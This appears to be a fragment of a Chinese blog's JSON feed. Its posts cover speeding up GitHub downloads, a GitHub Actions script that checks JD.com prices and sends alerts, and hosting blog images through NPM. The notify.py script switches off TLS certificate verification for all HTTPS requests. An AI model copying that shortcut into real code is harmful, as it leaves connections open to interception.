title=\"后\"></a>后</h2>\n<p>重启完毕后，再使用 <code>lscpu</code> 命令看看 CPU 状况。</p>\n","link":"https://blog.yfun.top/posts/1445549919/"},{"title":"加速 GitHub 下载","date":"2021-06-18 09:30:00","description":"\n<p>GitHub 在国内的访问情况不太稳定，仓库克隆速度也非常慢。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E2%9C%88%EF%B8%8F\" class=\"headerlink\" title=\"✈️\"></a>✈️</h2>\n<p>不必多说。</p>\n<p>例如 <a href=\"http://127.0.0.1:7890/\">http://127.0.0.1:7890</a> 为代理地址，你可以使用下方的命令更改：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global http.proxy http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>如果有一天不需要了，输入下面代码取消：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global --<span class=\"built_in\">unset</span> http.proxy</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#FastGit\" class=\"headerlink\" title=\"FastGit\"></a>FastGit</h2>\n<p>使用 <a href=\"https://fastgit.org/\">FastGit</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://hub.fastgit.org/\">https://hub.fastgit.org</a></p>\n<p>支持 HTTPS 克隆，并且提供 raw.githubusercontent.com 的镜像，地址为 <a href=\"https://raw.fastgit.org/\">https://raw.fastgit.org</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#CNPM\" class=\"headerlink\" title=\"CNPM\"></a>CNPM</h2>\n<p>使用 <a href=\"https://cnpmjs.org/\">CNPM</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://github.com.cnpmjs.org/\">https://github.com.cnpmjs.org</a></p>\n<p>支持 HTTPS 克隆。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Hosts\" class=\"headerlink\" title=\"Hosts\"></a>Hosts</h2>\n<p>通过更改 Hosts 文件的方式解决，但大有可能失效：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">199.232.69.194  github.global.ssl.fastly.net</span><br><span class=\"line\">140.82.113.4    github.com</span><br></pre></td></tr></table></figure><p>GitHub 上的 <a href=\"https://github.com/521xueweihan/GitHub520\">521xueweihan/GitHub520</a> 项目提供了更多关于 GitHub Hosts 列表。</p>\n<blockquote><p><a href=\"https://github.com/521xueweihan/GitHub520/issues/53\">521xueweihan/GitHub520 #53</a></p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#Gitee\" class=\"headerlink\" title=\"Gitee\"></a>Gitee</h2>\n<p>网上挺多教程，使用 Gitee 的「从 GitHub 导入」功能。</p>\n<p>不过 Gitee 限制仓库 500MB。。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Coding\" class=\"headerlink\" title=\"Coding\"></a>Coding</h2>\n<p>进入 Coding 控制台，点击「创建项目」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/k7uHJm.png\"></p>\n<p>项目模版选择「代码托管」就好，仅做下载的话无需开启太多。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bEO0vX.png\"></p>\n<p>填写项目基本信息，如名称、标识等。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/N4xjSv.png\"></p>\n<p>新建一个镜像仓库。</p>\n<p>「Git 仓库 URL」填写 GitHub 公开仓库 HTTPS 克隆地址，如：<a href=\"https://github.com/twbs/bootstrap.git\">https://github.com/twbs/bootstrap.git</a></p>\n<p>创建完成后请稍等，系统就会自动导入。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/YxnnDj.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/FmfWkf.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/OV7w4v.png\"></p>\n<p>导入完成后，点击「克隆」就能找到克隆地址。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bWszbu.png\"></p>\n<p>克隆速度挺快的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cloning into <span class=\"string\">'bootstrap'</span>...</span><br><span class=\"line\">remote: Enumerating objects: 169214, <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Counting objects: 100% (169214/169214), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Compressing objects: 100% (51634/51634), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">Receiving objects:  57% (96728/169214), 90.58 MiB | 6.83 MiB/s </span><br></pre></td></tr></table></figure><p>此外，Coding 还支持自动同步，可以设置每天的同步时间。</p>\n","link":"https://blog.yfun.top/posts/2517388641/"},{"title":"GitHub Action 监测京东商品价格","date":"2021-05-18 10:32:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p>我会在京东上买些电子产品和文具，那么如何获得商品降价信息，使用更低的价格购买呢？</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>新建一个 <code>GitHub</code> 仓库，创建 <code>main.py</code> , <code>notify.py</code> 和 <code>.github/workflows/auto.yml</code> 三个文件，内容如下：</p>  <details class=\"post-details\"><summary><code>main.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># 导入模块</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, random, json, notify</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 商品列表</span></span><br><span class=\"line\">check = [</span><br><span class=\"line\">    <span class=\"comment\"># 闪迪（SanDisk）64GB TF（MicroSD）存储卡</span></span><br><span class=\"line\">    <span class=\"string\">'1887526'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># 晨光(M&amp;G)文具 0.5mm 黑色中性笔</span></span><br><span class=\"line\">    <span class=\"string\">'277393'</span></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 价格列表，用于临时存储获取到的价格数据</span></span><br><span class=\"line\">price = {}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取上次的价格文件</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode=<span class=\"string\">'r'</span>)</span><br><span class=\"line\">    lastPrice = json.loads(file.readlines()[<span class=\"number\">0</span>])</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"读取文件时出现错误！\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 遍历列表，比对价格</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> itemId <span class=\"keyword\">in</span> check:</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    <span class=\"comment\"># http://p.3.cn/prices/mgets?skuIds=J_</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://p.3.cn/prices/mgets?skuIds=J_{}'</span>.<span class=\"built_in\">format</span>(itemId)</span><br><span class=\"line\">    <span class=\"comment\"># User-Agent 列表</span></span><br><span class=\"line\">    ua = [<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>,<span class=\"string\">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>]</span><br><span class=\"line\">    <span class=\"comment\"># 随机获得一个 User-Agent，如不带 User-Agent 请求，就会被拒绝。</span></span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: ua[random.randint(<span class=\"number\">0</span>,<span class=\"number\">4</span>)]</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求参数</span></span><br><span class=\"line\">    request = urllib.request.Request(url = url, headers = headers)</span><br><span class=\"line\">    <span class=\"comment\"># 向京东发起请求</span></span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    <span class=\"comment\"># 将获得的数据转为 JSON</span></span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    thisPrice = <span class=\"built_in\">float</span>(page_text[<span class=\"number\">0</span>][<span class=\"string\">'p'</span>])</span><br><span class=\"line\">    <span class=\"comment\"># 将价格输入至价格变量</span></span><br><span class=\"line\">    price[itemId] = thisPrice</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 尝试对比价格</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> thisPrice &gt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 涨价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\"></span><br><span class=\"line\">            print(thisPrice - lastPrice[itemId])</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">0</span>, thisPrice - lastPrice[itemId], thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> thisPrice &lt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 降价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">            print(lastPrice[itemId] - thisPrice)</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">2</span>, lastPrice[itemId] - thisPrice, thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> lastPrice[itemId] == thisPrice:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 价格不变\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 未知错误\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"无法进行比对\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 JSON 转为 字符串</span></span><br><span class=\"line\">priceStr = json.dumps(price)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 写入价格文件，便于下次查询</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode = <span class=\"string\">'w'</span>)</span><br><span class=\"line\">    file.write(priceStr)</span><br><span class=\"line\">    file.close()</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"写入文件时出现错误\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(price)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>notify.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, json, urllib.parse, ssl</span><br><span class=\"line\">ssl._create_default_https_context = ssl._create_unverified_context</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">提醒的服务，支持 `wechat` 与 `qmsg`。</span></span><br><span class=\"line\"><span class=\"string\">需要在下方进行下一步的配置</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">server = [<span class=\"string\">'qmsg'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">WeChat 采用的是 Server 酱 (https://sc.ftqq.com/3.version) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Server 酱提供的 Token，必填。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">wechat = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">Qmsg 采用的是 Qmsg 酱 (https://qmsg.zendee.cn/) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Qmsg 酱提供的 KEY，必填。</span></span><br><span class=\"line\"><span class=\"string\">qid：接收消息的 QQ 号（不支持 QQ 群），可以添加多个，以半角逗号分割，如：`10001,10002`（必须均在您的 Qmsg 酱 QQ 号列表中）。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">qmsg = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"qid\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wechat_send</span>(<span class=\"params\">key, title, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://sc.ftqq.com/{0}.send?text={1}&amp;desp={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(title), urllib.parse.quote(text))</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'errno'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">qmsg_send</span>(<span class=\"params\">key, <span class=\"built_in\">id</span>, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://qmsg.zendee.cn/send/{0}?msg={1}&amp;qq={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(text), <span class=\"built_in\">id</span>)</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'code'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">notify</span>(<span class=\"params\"><span class=\"built_in\">id</span>,<span class=\"built_in\">type</span>,price,nowPrice</span>):</span></span><br><span class=\"line\">    <span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">    type:</span></span><br><span class=\"line\"><span class=\"string\">        0: 涨价</span></span><br><span class=\"line\"><span class=\"string\">        1: 无变化</span></span><br><span class=\"line\"><span class=\"string\">        2: 降价</span></span><br><span class=\"line\"><span class=\"string\">    id: 商品 ID</span></span><br><span class=\"line\"><span class=\"string\">    price: 差价</span></span><br><span class=\"line\"><span class=\"string\">    nowPrice: 现价</span></span><br><span class=\"line\"><span class=\"string\">    '''</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> svId <span class=\"keyword\">in</span> server:</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send</span>(<span class=\"params\">title,content</span>):</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'wechat'</span>:</span><br><span class=\"line\">                wechat_send(wechat[<span class=\"string\">\"key\"</span>],title,content)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'qmsg'</span>:</span><br><span class=\"line\">                qmsg_send(qmsg[<span class=\"string\">\"key\"</span>],qmsg[<span class=\"string\">\"qid\"</span>],title + <span class=\"string\">\"\\n\"</span> + content)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">type</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 涨价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 涨价咯！价格相较于上次监测，高了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>,price,nowPrice)</span><br><span class=\"line\">            send(title,content)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"价格没有变化，不推送通知。\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">2</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 降价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 降价咯！价格相较于上次监测，低了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>, price,nowPrice)</span><br><span class=\"line\">            send(title, content)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>.github/workflows/auto.yml</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">Check</span> <span class=\"string\">Price</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">push:</span></span><br><span class=\"line\">    <span class=\"attr\">branches:</span> </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">master</span></span><br><span class=\"line\">  <span class=\"attr\">schedule:</span></span><br><span class=\"line\">    <span class=\"comment\"># 每 1 小时运行一次</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">cron:</span> <span class=\"string\">\"0 * * * *\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">check:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Clone</span> <span class=\"string\">repository</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">'Set up Python'</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-python@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">python-version:</span> <span class=\"number\">3.7</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Run</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">python</span> <span class=\"string\">main.py</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">date</span> <span class=\"string\">+\"%Y-%m-%d</span> <span class=\"string\">%H:%M:%S.%N\"</span> <span class=\"string\">&gt;</span> <span class=\"string\">date.txt</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-am</span> <span class=\"string\">\"Update price.json\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E6%B3%A8%E6%84%8F\" class=\"headerlink\" title=\"注意\"></a>注意</h2>\n<p>计划任务语法有 5 个字段，中间用空格分隔，每个字段代表一个时间单位。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌───────────── 分钟 (0 - 59)</span><br><span class=\"line\">│ ┌───────────── 小时 (0 - 23)</span><br><span class=\"line\">│ │ ┌───────────── 日 (1 - 31)</span><br><span class=\"line\">│ │ │ ┌───────────── 月 (1 - 12 或 JAN-DEC)</span><br><span class=\"line\">│ │ │ │ ┌───────────── 星期 (0 - 6 或 SUN-SAT)</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">* * * * *</span><br></pre></td></tr></table></figure><p>每个时间字段的含义：</p>\n<table>\n<thead><tr>\n<th align=\"center\">符号</th>\n<th align=\"center\">描述</th>\n<th align=\"center\">举例</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\"><code>*</code></td>\n<td align=\"center\">任意值</td>\n<td align=\"center\">\n<code>* * * * *</code> 每天每小时每分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>,</code></td>\n<td align=\"center\">值分隔符</td>\n<td align=\"center\">\n<code>1,3,4,7 * * * *</code> 每小时的 1 3 4 7 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>-</code></td>\n<td align=\"center\">范围</td>\n<td align=\"center\">\n<code>1-6 * * * *</code> 每小时的 1-6 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>/</code></td>\n<td align=\"center\">每</td>\n<td align=\"center\">\n<code>*/15 * * * *</code> 每隔 15 分钟</td>\n</tr>\n</tbody>\n</table>\n<blockquote><p>注：由于 GitHub Actions 的限制，如果设置为 <code>* * * * *</code> 实际的执行频率为每 5 分执行一次。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>新建文件 并 配置 <code>notify.py</code> 后，GitHub Action 就会定时执行代码。如果有降价或涨价，就会按照 <code>notify.py</code> 的配置进行通知。</p>\n<p>京东也有降价提醒的功能，但我实在是不想给 京东 开通知权限，经常推送商品广告。</p>\n<p>本文部分内容参考：<a href=\"https://github.com/justjavac/auto-green#readme\">justjavac/auto-green#readme</a></p>\n","link":"https://blog.yfun.top/posts/1238639652/"},{"title":"我的图床解决方案","date":"2021-05-08 10:30:00","description":"\n<p>博客的文章经常需要插入图片，如果我将文档与图片放在一起，那么图片的加载速度将会很慢，于是我使用了图床。</p>\n<p>图床的选择有很多，<a href=\"https://blog.yfun.top/posts/3867215122/\">笔者之前写过一篇关于免费图床的汇总</a>，本文就来介绍下我采用的方案：NPM。</p>\n<blockquote><p>本文假设您已有 NPM 账号、GitHub 账号。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3>\n<p>新建一个 GitHub 仓库，公开或是私人都可以，此处不再赘述。</p>\n<p>在 Git 仓库中新建 <code>rawimg/.gitkeep</code> 与 <code>webpimg/.gitkeep</code> 两个文件。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%8E%B7%E5%8F%96%E4%BB%A4%E7%89%8C\" class=\"headerlink\" title=\"获取令牌\"></a>获取令牌</h3>\n<p>登录 <a href=\"https://npmjs.com/\">https://npmjs.com</a> ，点击右上角的头像，进入 <code>Access Token</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/1Xbrlw.png\"></p>\n<p>点击页面中的 <code>Generate New Token</code> 获取新的令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OQMmsB.png\"></p>\n<p>选择 <code>Automation</code>，点击 <code>Generate Token</code> 生成令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/4Ob3xs.png\"></p>\n<p>将生成的令牌复制下来。</p>\n<p>进入 GitHub 仓库，点击 <code>Settings</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UfBqld.png\"></p>\n<p>点击菜单栏中的 <code>Secrets</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/SStNlF.png\"></p>\n<p>点击 <code>New repository secret</code> 新建一个 Secret。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UYSnao.png\"></p>\n<p>Secret Name 为 <code>NPM_TOKEN</code>，Value 是你的 NPM 令牌，点击 <code>Add secret</code> 添加。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OY4C6A.png\"></p>\n<p>在仓库中新建 <code>package.json</code> 文件，参考如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">{</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"ocoke-osg\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"0.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"Somewhere to save the file from @oCoke\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"YFun(@oCoke)\"</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%8E%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"图片转换与发布\"></a>图片转换与发布</h2>\n<p>为了方便多端写作，我使用 GitHub 临时存储所需的图片，GitHub Action 发布 NPM 包。</p>\n<p>WebP 可以大大缩减图片的尺寸，我们还可以借助 GitHub Action 在发布前自动转换。</p>  <details class=\"post-details\"><summary>GitHub Action 代码 (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">NPM</span> <span class=\"string\">&amp;</span> <span class=\"string\">WebP</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在 Release 发布时 或手动执行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span 